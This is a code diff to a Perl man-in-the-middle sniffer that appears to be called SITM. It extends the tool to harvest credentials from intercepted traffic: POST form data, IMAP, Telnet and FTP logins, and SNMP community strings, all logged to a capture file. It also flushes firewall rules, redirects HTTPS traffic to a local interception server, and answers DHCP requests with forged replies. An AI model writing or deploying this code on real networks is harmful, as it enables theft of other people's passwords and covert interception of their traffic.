@@ -1,17 +1,39 @@
 my $DataOnPipe : shared = 0;
+my $PasswordOnPipe : shared = 0;
 my %ResolvedHosts : shared = ();
 my @LogEntry : shared = ();
+my @PasswordEntry : shared = ();
 my $Sniffer_Started = 0;
+my $telnet_tmp;
+my $telnet_user;
+my $telnet_pass;
 my $NetworkListener;
 my $i = 1;
+my $host;
 my $sip_intercepting = 0;
 my @rtpport;
 
 Net::MAC::Vendor::load_cache("Mac_Cache.txt");
+
+open(LOGFILE,">>Capture.log");
+
 sub Start_NetworkListener{
     system("echo 1 > /proc/sys/net/ipv4/ip_forward");
+    system("iptables -F");
+    system("iptables -X");
+    my @CurSettings = GetSettings();
+
     my $NetworkListener = threads->new(\&Start_NetworkListener_Thread);
     $NetworkListener->detach();
+
+    if (8 ~~ @CurSettings)
+    {
+        system("iptables -t nat -F");
+        system("iptables -t nat -X");
+        system("iptables -t nat -i ".GetSelectedInterface()." -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 8080");
+        my $HTTP_SSL_Server = threads->new(\&Start_HTTP_SSL_Server_Thread);
+        $HTTP_SSL_Server->detach();
+    }
     $Sniffer_Started = 1;
 }
 
@@ -27,8 +49,27 @@ sub Stop_NetworkListener{
     }
 }
 
+#Host, Protocol, Username, Password
+sub AddPassword{
+    push(@PasswordEntry, ("[".$_[0]."][".$_[1]."]".$_[2].":".$_[3]));
+    $PasswordOnPipe = 1;
+}
+
+sub GetPasswords{
+    return @PasswordEntry;
+}
+
+sub ClearPasswordPipe {
+    @PasswordEntry = ();
+}
+
+sub SetPassPipeStatus{
+    return 0;
+}
+
 sub AddLogInfo{
     push(@LogEntry, $_[0]);
+    print LOGFILE $_[0];
     $DataOnPipe = 1;
 }
 
@@ -58,6 +99,7 @@ sub GetResolvedHosts{
 
 sub Start_NetworkListener_Thread
 {
+        $SIG{'KILL'} = sub { threads->exit(); };
         my @Settings = GetSettings();
         AddLogInfo("Started [MAC : ".get_interface_mac(GetSelectedInterface())."]\n");
         my $ipaddress = get_interface_address(GetSelectedInterface());
@@ -74,16 +116,26 @@ sub Start_NetworkListener_Thread
                     {
                         #AddLogInfo("Got POST Data : " .$tcp->{data}."\n");
                         $datasrc = $tcp->{src_port};
+                        my @wrequest = split(/\n/, $tcp->{data});
+                        foreach my $line (@wrequest)
+                        {
+                            if ($line =~ s/Host: //)
+                            {
+                                $host = $line;
+                                AddLogInfo("[POST] Request on : $line\n");
+                            }
+                        }
                         print STDERR "POST DATA AT PORT : $datasrc\n";
                     }
-                    elsif ($datasrc eq $tcp->{src_port})
+                    elsif ($datasrc and $datasrc eq $tcp->{src_port})
                     {
                         #AddLogInfo("RETRANSMISSION TCP : " .$tcp->{data}." DONE \n");
                         #print STDERR "RETRANSMISSION TCP : ".$tcp->{data}."\n";
                         #AddLogInfo($tcp->{data}."\n");
                         my @tmp = split(/&/, $tcp->{data});         
                         foreach my $data (@tmp){
-                            AddLogInfo("Got POST Parameter : $data.\n");
+                            AddLogInfo("[POST] $host : $data\n");
+                            
                         }
                         $datasrc = 0;
                     }
@@ -92,6 +144,7 @@ sub Start_NetworkListener_Thread
                 elsif ($tcp->{dest_port} == 143 && 6 ~~ @Settings)
                 {
                     my $login_packet =($ether->{data});
+                    my $destination = $ip->{dest_ip};
                     my $pack_hex = unpack("H*", $login_packet);
                     my $pack_type=index($pack_hex, "6c6f");
                         
@@ -100,14 +153,42 @@ sub Start_NetworkListener_Thread
                         my $packet_offset = substr $pack_hex, $pack_type; 
                         my $packet_final = pack("H*",$packet_offset);
                         my @logins= split (/ /, $packet_final); 
-                        AddLogInfo("IMAP : ".$logins[0].":".$logins[1]." - Password: ".$logins[2]."\n");
+                        AddLogInfo("[IMAP][$destination] ".$logins[0].":".$logins[1]." - Password: ".$logins[2]."\n");
+                        AddPassword($destination,"IMAP",$logins[1],$logins[2]);
                     }
+                }
+                elsif ($tcp->{dest_port} == "23" && 5 ~~ @Settings){
+                    my $destination = $ip->{dest_ip};
+                    if ($tcp->{data} =~ /[a-zA-Z0-9]/)
+                    {
+                        $telnet_tmp .= $tcp->{data};
+                    }
+                    elsif ($tcp->{data} =~ /\r/)
+                    {
+                        if ($passmatch == 0)
+                        {
+                            AddLogInfo("[Telnet][$destination] LOGIN IS : $telnet_tmp\n");
+                            $telnet_user = $telnet_tmp;
+                        }
+                        else
+                        {
+                            AddLogInfo("[Telnet][$destination] PASSWORD IS : $telnet_tmp\n");
+                            AddPassword($destination,"TELNET",$telnet_user,$telnet_tmp);
+                            $telnet_user = "";
+                            $telnet_pass = "";
+                            $passmatch = 0;
+                        }
+                        $telnet_tmp = "";
+                        $passmatch = 1;
+                    }
+                    
                 }
                 elsif ($tcp->{dest_port} == 21 && 4 ~~ @Settings)
                 {        
                     if ($tcp->{data})
                     {
                         my $data = $tcp->{data};
+                        my $destination = $ip->{dest_ip};
                         my @table = split(" ",$data);
                         if (exists($table[0]) && $table[0] eq 'USER' && exists($table[1]))
                         {
@@ -115,7 +196,7 @@ sub Start_NetworkListener_Thread
                         }
                         if(exists($table[0])&& $table[0]  eq 'PASS' && exists($table[1]))
                         {
-                            AddLogInfo("FTP : ".$username." ".$table[1] ."\n");
+                            AddLogInfo("[FTP][$destination] USER : ".$username." PASS : ".$table[1] ."\n");
                             #print "Le mot de passe est : " .$table[1] ."\n"; 
                         }
                     }
@@ -159,7 +240,6 @@ sub Start_NetworkListener_Thread
                             AddLogInfo("SIP Audio Transmission detected at port : " .$_->{port}." \n");
                         } 
                     }
-                
                 }
                 elsif ($udp->{dest_port} ~~ @rtpport && SIPFDAUDIO)
                 {
@@ -173,7 +253,7 @@ sub Start_NetworkListener_Thread
                             print SIPFDDATA $rtppacket->payload;
                         }
                 }
-                elsif ($udp->{dest_port} == 67 && 11 ~~ @Settings)
+                elsif ($udp->{dest_port} == 67 && 12 ~~ @Settings)
                 {
                     AddLogInfo("[SITM] Got DHCP Request from $ether->{src_mac}!\n");
                     my $packet = Net::DHCP::Packet->new($udp->{data});
@@ -185,6 +265,20 @@ sub Start_NetworkListener_Thread
                     {
                         ForgeDHCPServer($packet->xid(),"10.8.99.$i",get_interface_address(GetSelectedInterface()),DHCPACK(),$ether->{src_mac});
                         $i++;
+                    }
+                }
+                elsif ($udp->{dest_port} == 161 && 7 ~~ @Settings)
+                {
+                    my $destination = $ip->{dest_ip};
+                    my $packet = unpack("H*",$udp->{data}) =~ m/(.*?)a0/;
+                    if ($1)
+                    {
+                        my ($version,$community) = unpack('x4cx2a*' , pack("H*",$1));
+                        if ($version < 3)
+                        {
+                            AddLogInfo("[SNMP][$destination] Version : ".($version+1)." - Community : $community\n");
+                            AddPassword($destination,"SNMP","COMMUNITY ",$community)
+                        }
                     }
                 }
                 
@@ -211,7 +305,7 @@ sub Start_NetworkListener_Thread
         AddLogInfo("Netmask : " .$npe->netmask ."\n");
 
         my $block = GetLocalNetInfo($npe->network, $npe->netmask);
-        AddLogInfo("SITM Network Listener [".$block->first()."][".$block->last()."] started.");
+        AddLogInfo("SITM Network Listener [".$block->first()."][".$block->last()."] started.\n");
 
         1 while $npe->loop;
     
